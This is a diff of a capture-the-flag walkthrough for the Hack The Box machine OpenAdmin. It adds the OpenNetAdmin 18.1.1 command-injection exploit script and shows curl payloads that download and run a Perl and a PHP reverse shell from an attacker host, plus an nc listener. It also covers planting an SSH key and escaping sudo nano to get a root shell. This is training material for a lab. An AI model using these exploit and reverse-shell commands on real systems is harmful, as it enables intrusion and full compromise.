@@ -20,7 +20,10 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-We find two services running: SSH and a web server.
+We find two services running: 
+
+* SSH 
+* Web server
 
 ## Dirbusting Web Server
 
@@ -32,13 +35,13 @@ Let's run dirbuster to gather more information.
 
 We found a few folders. Most of them contain static resources. 
 
-But **/ona/** looks interesting as it appears to be a php application.
+But **/ona/** looks interesting as it appears to be a PHP application.
 
 ![ona homepage](images/openadmin/onahome.png)
 
-The application is OpenNetAdmin version 18.1.1.
+The application is **OpenNetAdmin version 18.1.1**.
 
-## Exploiting OpenNetAdmin
+## OpenNetAdmin RCE Exploit
 
 [OpenNetAdmin](https://opennetadmin.com/) is a network management tool that offers a database managed inventory of your IP network.
 
@@ -50,6 +53,27 @@ root@kali:~/htb/openadmin# searchsploit opennetadmin
 OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)                                         | exploits/php/webapps/47772.rb
 OpenNetAdmin 18.1.1 - Remote Code Execution                                                          | exploits/php/webapps/47691.sh
 ```
+
+### Understanding The Exploit
+
+This is the exploit script.
+
+```
+#!/bin/bash
+
+URL="${1}"
+while true;
+do
+ echo -n "$ "; read cmd
+ curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
+done
+```
+
+Essentially, it loops infinitely as it takes in what you type at the command line and sends it to the vunerable URL to trigger the RCE. 
+
+Together with some formatting magic, it returns only the response to the sent command. This way, it creates the impression of having a shell on the exploited machine.
+
+(It includes BEGIN and END in the sent payload to act as markers, before using sed to grep and print what's between these two markers.)
 
 ### Verifying The Exploit
 
@@ -95,7 +119,7 @@ This first command will download the shell into Openadmin.
 
 `curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";wget http://10.10.X.X:8000/perlshell;echo \"END\"&xajaxargs[]=ping" http://10.10.10.171/ona/`
 
-This second comment will execute the perl script, pushing a shell back to our nc handler.
+This second command will execute the perl script, pushing a shell back to our nc handler.
 
 `curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";perl perlshell;echo \"END\"&xajaxargs[]=ping" http://10.10.10.171/ona/`
 
@@ -214,6 +238,8 @@ We also see that we can access the vhost at port 52846.
 
 ### Getting A Shell
 
+First, let's infiltrate a php payload.
+
 ```
 jimmy@openadmin:/var/www/internal$ wget http://10.10.14.8:8000/sorryfortheshell.php
 --2020-04-10 14:53:18--  http://10.10.14.8:8000/sorryfortheshell.php
@@ -225,45 +251,65 @@ Saving to: ‘sorryfortheshell.php’
 sorryfortheshell.php                100%[=================================================================>]   5.36K  --.-KB/s    in 0.001s  
 
 2020-04-10 14:53:18 (3.55 MB/s) - ‘sorryfortheshell.php’ saved [5492/5492]
+```
 
-jimmy@openadmin:/var/www/internal$ curl http://127.0.0.1:52846/sorryfortheshell.php
+Then, we trigger it.
+    
+`curl http://127.0.0.1:52846/sorryfortheshell.php`
+
+We receive a connection on our handler.
+
+```
+root@kali:~/htb/openadmin# nc -nvlp 8888
+listening on [any] 8888 ...
+connect to [10.10.14.8] from (UNKNOWN) [10.10.10.171] 55872
+<SNIP>
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+joanna
 ```
 
 ## Abusing Sudo Rights For Privilege Escalation
-
-We cannot get nano to run properly in a simple shell. So let's add our SSH key to joanna's account and get a SSH shell.
-
-## Privilege Escalation
 
 Run `sudo -l` to list joanna's privilege.
 
 ```
 /etc/sudoers.d/joanna:joanna ALL=(ALL) NOPASSWD:/bin/nano /opt/priv
 ```
-Since we can run Perl as root (without password!), we can escalate our privilege by launching a new shell with Perl. By running perl with root privileges,
+
+We can run nano as root (without password), but only for editing a specific file `/opt/priv`.
+
+### Launching Nano
+
+We cannot get nano to run properly in a simple shell. So let's add our SSH key to joanna's account and get a SSH shell.
+
+First, let's generate new keys.
+
+`ssh-keygen -f openadmin`
+
+Then, add our public key (`openadmin.pub`) into joanna's authorized_keys.
+
+`$ echo 'ssh-rsa <SNIP> root@kali' >> authorized_keys`
+
+We can now connect to the machine via SSH as joanna.
+
+`ssh joanna@10.10.10.171 -i openadmin`
 
 ### Getting A Shell From Within Nano
 
-```
-shelly@Shocker:/home/shelly$ sudo perl -e 'exec "/bin/bash";'          
-sudo perl -e 'exec "/bin/bash";'
-whoami
-root
-```
+Now, let's launch nano as root.
+
+`sudo /bin/nano /opt/priv`
+
+[To escape nano into shell](https://gtfobins.github.io/gtfobins/nano/):
+
+* Then, press `^R` followed by `^X` to execute command within nano.
+* Execute `reset; sh 1>&0 2>&0` to escape into a shell. 
+
+You can also execute any reverse shell one liner.
+
+![nano escape](images/openadmin/nanoescape.png)
 
 # Ending Thoughts
 
-getting a shell
-
-Although this is an easy straightforward box, I've learned more by exploiting manually using Burp to sent requests and trying to understand every step of the way.
-
-You can also use Metasploit or other available exploits to root this box.
-
-**References**
-
-* https://www.netsparker.com/blog/web-security/cve-2014-6271-shellshock-bash-vulnerability-scan/
-* https://www.symantec.com/connect/blogs/shellshock-all-you-need-know-about-bash-bug-vulnerability
-* https://resources.infosecinstitute.com/bash-bug-cve-2014-6271-critical-vulnerability-scaring-internet/#gref
-* https://blog.knapsy.com/blog/2014/10/07/basic-shellshock-exploitation/
-* https://github.com/opsxcq/exploit-CVE-2014-6271
-* https://www.surevine.com/shellshocked-a-quick-demo-of-how-easy-it-is-to-exploit/ (A simple demo)
+This is an easy box that reinforces a few basic techniques for Linux boxes.
